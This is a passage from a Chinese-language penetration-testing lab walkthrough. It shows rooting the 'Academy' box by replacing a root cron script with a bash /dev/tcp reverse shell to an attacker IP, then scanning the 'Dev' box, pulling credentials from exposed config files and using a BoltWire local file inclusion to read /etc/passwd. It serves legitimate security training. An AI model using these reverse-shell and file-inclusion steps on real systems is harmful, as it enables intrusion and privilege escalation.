Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span><br><span class="line">**grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash**</span><br></pre></td></tr></table></figure>
<ul>
<li>DB帳戶是grimmie，該用戶是管理員身分</li>
<li>嘗試SSH登入，將帳密輸入</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ssh grimmie@192.168.19.141                                                                               </span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.19.141 (192.168.19.141)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:eeNKTTakhvXyaWVPMDTB9+/4WEg6WKZwlUp0ATptgb0.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.19.141<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">grimmie@192.168.19.141&#x27;</span>s password: **My_V3ryS3cur3_P4ss**</span><br><span class="line">Linux academy 4.19.0-16-amd64 <span class="comment">#1 SMP Debian 4.19.181-1 (2021-03-19) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun May 30 03:21:39 2021 from 192.168.10.31</span><br><span class="line">grimmie@academy:~$</span><br><span class="line">grimmie@academy:~$ <span class="built_in">ls</span></span><br><span class="line">backup.sh</span><br><span class="line">grimmie@academy:~$ **<span class="built_in">cat</span> backup.sh**  <span class="comment">#periodic check 工作週期檢查，讓系統去執行一些固定時間要自動進行的例行性工作</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> /tmp/backup.zip</span><br><span class="line">zip -r /tmp/backup.zip /var/www/html/academy/includes</span><br><span class="line"><span class="built_in">chmod</span> 700 /tmp/backup.zip</span><br><span class="line"></span><br><span class="line">grimmie@academy:~$ **crontab -l** <span class="comment">#-l UserName	列出使用者的 crontab 檔案。</span></span><br><span class="line">no crontab <span class="keyword">for</span> grimmie  </span><br><span class="line">grimmie@academy:~$ **crontab -u root -l** <span class="comment">#列出使用者 Cron 工作的狀態。</span></span><br><span class="line">must be privileged to use -u <span class="comment">#目前沒sudo執行權限</span></span><br><span class="line">grimmie@academy:~$ **crontab -e** <span class="comment">#建立 crontab 並選擇預設編輯器</span></span><br><span class="line">no crontab <span class="keyword">for</span> grimmie - using an empty one</span><br><span class="line"></span><br><span class="line">Select an editor.  To change later, run <span class="string">&#x27;select-editor&#x27;</span>.</span><br><span class="line">  1. /bin/nano        &lt;---- easiest</span><br><span class="line">  2. /usr/bin/vim.tiny</span><br><span class="line"></span><br><span class="line">Choose 1-2 [1]: 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>  <img src="/img/privilege_Untitled_11.png" alt="Untitled"></p>
<ul>
<li>列出計時器，查看是否有腳本正在運行計時器</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grimmie@academy:~$ **systemctl list-timers** </span><br><span class="line">NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTIVATES</span><br><span class="line">Thu 2024-02-15 15:39:00 EST  24min left Thu 2024-02-15 15:09:01 EST  5min ago     phpsessionclean.timer        phpsessionclean.service</span><br><span class="line">Fri 2024-02-16 00:00:00 EST  8h left    n/a                          n/a          logrotate.timer              logrotate.service</span><br><span class="line">Fri 2024-02-16 00:00:00 EST  8h left    n/a                          n/a          man-db.timer                 man-db.service</span><br><span class="line">Fri 2024-02-16 05:17:18 EST  14h left   n/a                          n/a          apt-daily.timer              apt-daily.service</span><br><span class="line">Fri 2024-02-16 06:58:25 EST  15h left   n/a                          n/a          apt-daily-upgrade.timer      apt-daily-upgrade.service</span><br><span class="line">Fri 2024-02-16 11:30:17 EST  20h left   Thu 2024-02-15 11:30:17 EST  3h 44min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service</span><br><span class="line"></span><br><span class="line">6 timers listed.</span><br><span class="line">Pass --all to see loaded but inactive timers, too.</span><br><span class="line"></span><br><span class="line">grimmie@academy:~$ ps <span class="comment">#前運行的進程</span></span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">29894 pts/0    00:00:00 bash</span><br><span class="line">30189 pts/0    00:00:00 ps <span class="comment">#顯示當前運行的進程信息</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>驗證和確認腳本是<strong>在計時器上運行</strong>，使用PSPY <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p>
</li>
<li><p>記得將這腳本放到遠程傳送的目錄下，也就是開啟了http.server的目錄位置</p>
<ul>
<li>testscript&#x2F;trans</li>
<li>下載腳本到grimmie的用戶下</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grimmie@academy:/tmp$ wget http://192.168.19.130/pspy64</span><br><span class="line">--2024-02-15 15:26:04--  http://192.168.19.130/pspy64</span><br><span class="line">Connecting to 192.168.19.130:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3104768 (3.0M) [application/octet-stream]</span><br><span class="line">Saving to: ‘pspy64’</span><br><span class="line"></span><br><span class="line">pspy64                               100%[===================================================================&gt;]   2.96M  --.-KB/s    <span class="keyword">in</span> 0.09s   </span><br><span class="line"></span><br><span class="line">2024-02-15 15:26:04 (31.5 MB/s) - ‘pspy64’ saved [3104768/3104768]</span><br></pre></td></tr></table></figure>
<ul>
<li>現在用工具確認backup.sh正在運行</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grimmie@academy:/tmp$ **./pspy64** </span><br><span class="line">pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d</span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ </span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ </span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  </span><br><span class="line">                   ░           ░ ░     </span><br><span class="line">                               ░ ░     </span><br><span class="line"></span><br><span class="line">Config: Printing events (colored=<span class="literal">true</span>): processes=<span class="literal">true</span> | file-system-events=<span class="literal">false</span> ||| Scanning <span class="keyword">for</span> processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)</span><br><span class="line">Draining file system events due to startup...</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">2024/02/15 15:26:54 CMD: UID=1000  PID=30261  | ./pspy64 </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=29932  | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=1000  PID=29894  | -bash </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=1000  PID=29893  | sshd: grimmie@pts/0  </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=1000  PID=29885  | (sd-pam) </span><br><span class="line">.........</span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=9      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=8      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=6      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=4      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=3      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=2      | </span><br><span class="line">2024/02/15 15:26:54 CMD: UID=0     PID=1      | /sbin/init </span><br><span class="line">2024/02/15 15:27:01 CMD: UID=0     PID=30268  | /usr/sbin/CRON -f </span><br><span class="line">2024/02/15 15:27:01 CMD: UID=0     PID=30269  | /usr/sbin/CRON -f </span><br><span class="line">**2024/02/15 15:27:01 CMD: UID=0     PID=30270  | /bin/sh -c /home/grimmie/backup.sh </span><br><span class="line">2024/02/15 15:27:01 CMD: UID=0     PID=30271  | /bin/bash /home/grimmie/backup.sh </span><br><span class="line">2024/02/15 15:27:01 CMD: UID=0     PID=30272  | /bin/bash /home/grimmie/backup.sh </span><br><span class="line">2024/02/15 15:27:01 CMD: UID=0     PID=30273  | /bin/bash /home/grimmie/backup.sh**</span><br></pre></td></tr></table></figure>
</li>
<li><p>進行提權，前面結果看到利用&#x2F;bin&#x2F;bash 去執行了 backup.sh，我們可以修改sh檔案進行利用</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
<li>Bash</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.19.130/8081 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<ul>
<li><p>kali(attacker vm) → <code>nc -nlvp 8081</code></p>
</li>
<li><p>grimmie →</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano backup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctrl + k清除該行文字</span></span><br><span class="line"><span class="comment">#填入</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.19.130/8081 0&gt;&amp;1 <span class="comment">#提升權限到root</span></span><br></pre></td></tr></table></figure>
<p>  <img src="/img/privilege_Untitled_12.png" alt="Untitled"></p>
</li>
<li><p><a target="_blank" rel="noopener" href="http://等待排程執行到backup.sh/">等待排程執行到backup.sh</a>，就成功執行該提權指令</p>
</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nc -nlvp 8081**</span><br><span class="line">listening on [any] 8081 ...</span><br><span class="line">connect to [192.168.19.130] from (UNKNOWN) [192.168.19.141] 49870</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (30439): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@academy:~# **<span class="built_in">whoami</span>**</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">root@academy:~# <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">**flag.txt**</span><br><span class="line">root@academy:~# **<span class="built_in">cat</span> flag.txt**</span><br><span class="line">Congratz you rooted this box !</span><br><span class="line">Looks like this CMS isn<span class="string">&#x27;t so secure...</span></span><br><span class="line"><span class="string">I hope you enjoyed it.</span></span><br><span class="line"><span class="string">If you had any issue please let us know in the course discord.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Happy hacking !</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Walkthrough-Dev"><a href="#Walkthrough-Dev" class="headerlink" title="Walkthrough - Dev"></a><strong>Walkthrough - Dev</strong></h3><ul>
<li>192.168.19.142</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nmap -T4 -A -p- 192.168.19.142**</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-15 15:47 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.142</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65526 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 bd:96:ec:08:2f:b1:ea:06:ca:<span class="built_in">fc</span>:46:8a:7e:8a:e3:55 (RSA)</span><br><span class="line">|   256 56:32:3b:9f:48:2d:e0:7e:1b:<span class="built_in">df</span>:20:f8:03:60:56:5e (ECDSA)</span><br><span class="line">|_  256 95:<span class="built_in">dd</span>:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.38 ((Debian))</span><br><span class="line">**|_http-title: Bolt - Installation error</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)**</span><br><span class="line">111/tcp   open  rpcbind  2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3           2049/udp   nfs</span><br><span class="line">|   100003  3           2049/udp6  nfs</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3      41323/tcp   mountd</span><br><span class="line">|   100005  1,2,3      49494/udp6  mountd</span><br><span class="line">|   100005  1,2,3      51274/udp   mountd</span><br><span class="line">|   100005  1,2,3      55743/tcp6  mountd</span><br><span class="line">|   100021  1,3,4      37638/udp   nlockmgr</span><br><span class="line">|   100021  1,3,4      43669/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      43833/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      60309/udp6  nlockmgr</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">2049/tcp  open  **nfs**      3-4 (RPC <span class="comment">#100003)</span></span><br><span class="line">8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">| http-open-proxy: Potentially OPEN proxy.</span><br><span class="line">|_Methods supported:CONNECTION</span><br><span class="line">|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()</span><br><span class="line">36403/tcp open  mountd   1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">41323/tcp open  mountd   1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">43609/tcp open  mountd   1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">43833/tcp open  nlockmgr 1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">MAC Address: 00:0C:29:BE:3A:C6 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.28 ms 192.168.19.142</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 20.59 seconds</span><br></pre></td></tr></table></figure>

<p>開啟網頁查看</p>
<ul>
<li><p>目前有兩個網頁</p>
<ul>
<li>8080&#x2F;tcp  open  http     Apache httpd 2.4.38 ((Debian))</li>
<li>80&#x2F;tcp    open  http     Apache httpd 2.4.38 ((Debian))</li>
</ul>
<p>  <img src="/img/privilege_Untitled_13.png" alt="Untitled"></p>
<p>  <img src="/img/privilege_Untitled_14.png" alt="Untitled">
  </p>
</li>
<li><p>php 資訊頁面</p>
<ul>
<li>洩漏資訊</li>
<li>頁面設定</li>
<li>information disclosure</li>
<li>跟伺服器有關的訊息</li>
<li>錯誤配置可能導致能進行漏洞利用</li>
</ul>
</li>
<li><p>尋找可能存在的網頁目錄位置</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.19.142/FUZZ</span><br><span class="line"></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 2ms]</span></span><br><span class="line">                        [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1ms]</span><br><span class="line"><span class="comment"># on atleast 2 different hosts [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 4ms]</span></span><br><span class="line">public                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 2ms]</span><br><span class="line"><span class="comment"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 218ms]</span></span><br><span class="line">src                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 1ms]</span><br><span class="line">app                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 1ms]</span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 511ms]</span></span><br><span class="line">vendor                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 1ms]</span><br><span class="line">extensions              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 1ms]</span><br><span class="line"><span class="comment"># This work is licensed under the Creative Commons  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 818ms]</span></span><br><span class="line"><span class="comment"># Copyright 2007 James Fisher [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 824ms]</span></span><br><span class="line"><span class="comment"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 866ms]</span></span><br><span class="line"><span class="comment"># directory-list-2.3-medium.txt [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 880ms]</span></span><br><span class="line"><span class="comment"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1146ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1153ms]</span></span><br><span class="line"><span class="comment"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1178ms]</span></span><br><span class="line"><span class="comment"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1406ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1710ms]</span></span><br><span class="line">                        [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1866ms]</span><br><span class="line">server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 6ms]</span><br><span class="line">:: Progress: [220560/220560] :: Job [1/1] :: 796 req/sec :: Duration: [0:00:52] :: Errors: 0 ::**</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.19.142:8080/FUZZ</span><br><span class="line"></span><br><span class="line"><span class="comment"># on atleast 2 different hosts [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 18ms]</span></span><br><span class="line"><span class="comment"># This work is licensed under the Creative Commons  [Status: 200, Size: 94539, Words: 4684, Lines: 1159, Duration: 75ms]</span></span><br><span class="line"><span class="comment"># Copyright 2007 James Fisher [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 143ms]</span></span><br><span class="line"><span class="comment"># directory-list-2.3-medium.txt [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 180ms]</span></span><br><span class="line"><span class="comment"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 428ms]</span></span><br><span class="line">dev                     [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 3ms]</span><br><span class="line">                        [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 490ms]</span><br><span class="line"><span class="comment"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 671ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 686ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 704ms]</span></span><br><span class="line"><span class="comment"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 708ms]</span></span><br><span class="line"><span class="comment"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 699ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 713ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 712ms]</span></span><br><span class="line"><span class="comment"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 731ms]</span></span><br><span class="line">                        [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 11ms]</span><br><span class="line">server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 4ms]</span><br><span class="line">:: Progress: [220560/220560] :: Job [1/1] :: 6896 req/sec :: Duration: [0:00:51] :: Errors: 0 ::**</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>查看 80 port</p>
<ul>
<li>pubilc &gt; 404 not founud</li>
<li>src &gt; Site &gt;  CustomisationExtension.php &gt; nothing here</li>
</ul>
<p>  <img src="/img/privilege_Untitled_15.png" alt="Untitled"></p>
<p>  <img src="/img/privilege_Untitled_16.png" alt="Untitled"></p>
<ul>
<li>app &gt;<ul>
<li>cache &gt;<ul>
<li><p>config-cache.json</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;database&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;driver&quot;</span>: <span class="string">&quot;pdo_sqlite&quot;</span>,</span><br><span class="line">            <span class="string">&quot;host&quot;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">            <span class="string">&quot;slaves&quot;</span>: [],</span><br><span class="line">            <span class="string">&quot;dbname&quot;</span>: <span class="string">&quot;bolt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;prefix&quot;</span>: <span class="string">&quot;bolt_&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>: <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;collate&quot;</span>: <span class="string">&quot;utf8_unicode_ci&quot;</span>,</span><br><span class="line">            <span class="string">&quot;randomfunction&quot;</span>: <span class="string">&quot;RANDOM()&quot;</span>,</span><br><span class="line">            **<span class="string">&quot;databasename&quot;</span>: <span class="string">&quot;bolt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;bolt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;I_love_java&quot;</span>,</span><br><span class="line">            <span class="string">&quot;user&quot;</span>: <span class="string">&quot;bolt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;wrapperClass&quot;</span>: <span class="string">&quot;Bolt\\Storage\\Database\\Connection&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/var/www/html/app/database/bolt.db&quot;</span>**</span><br></pre></td></tr></table></figure>
</li>
<li><p>development&#x2F;</p>
</li>
<li><p>exception&#x2F;</p>
</li>
<li><p>profiler&#x2F;</p>
</li>
<li><p>trans&#x2F;</p>
</li>
</ul>
</li>
<li>config &gt;<ul>
<li><p>config.yml</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">database:</span><br><span class="line">driver: sqlite</span><br><span class="line">databasename: bolt</span><br><span class="line">username: bolt</span><br><span class="line">password: I_love_java</span><br></pre></td></tr></table></figure>
</li>
<li><p>contenttypes.yml</p>
</li>
<li><p>extensions&#x2F;</p>
</li>
<li><p>menu.yml</p>
</li>
<li><p>permissions.yml</p>
</li>
<li><p>routing.yml</p>
</li>
<li><p>taxonomy.yml</p>
</li>
</ul>
</li>
<li>database &gt;bolt.db</li>
<li>unt &gt; loaded on a very old version of PHP</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/img/privilege_Untitled_17.png" alt="Untitled"></p>
<ul>
<li><p>查看8080 port</p>
<ul>
<li><p>dev &gt; boltwire setup successfully</p>
<ul>
<li>register</li>
</ul>
<p>  <img src="/img/privilege_Untitled_18.png" alt="Untitled"></p>
<p>  <img src="/img/privilege_Untitled_19.png" alt="Untitled"></p>
<ul>
<li><p>查找BoltWire相關漏洞</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/48411">https://www.exploit-db.com/exploits/48411</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Cyber-Wo0dy/CVE-2023-46501">https://github.com/Cyber-Wo0dy/CVE-2023-46501</a></li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **searchsploit boltwire**</span><br><span class="line">--------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                 |  Path</span><br><span class="line">--------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">BoltWire 3.4.16 - <span class="string">&#x27;index.php&#x27;</span> Multiple Cross-Site Scripting Vulnerabilities                                    | php/webapps/36552.txt</span><br><span class="line">BoltWire 6.03 - **Local File Inclusion**                                                                           | php/webapps/48411.txt</span><br><span class="line">--------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
<ul>
<li>Cross-Site Scripting Vulnerabilities 對於這次攻擊目標的危害不大</li>
<li>除非有人模仿用戶進入並實際瀏覽網站</li>
<li>目前沒有要進行攻擊用戶的行為</li>
<li>關注Local File Inclusion 並利用這個漏洞去訪問一些機敏文件</li>
<li>修改&#x2F;index.php後的路徑<ul>
<li>必須是註冊後且登入用戶才可利用</li>
</ul>
</li>
</ul>
<p>  <img src="/img/privilege_Untitled_20.png" alt="Untitled"></p>
<ul>
<li>成功利用漏洞，可以嘗試換成查看&#x2F;etc&#x2F;shadow，也許可以看到passwd hash，但該頁面再這邊沒有任何內容</li>
</ul>
<p>  <img src="/img/privilege_Untitled_21.png" alt="Untitled"></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System 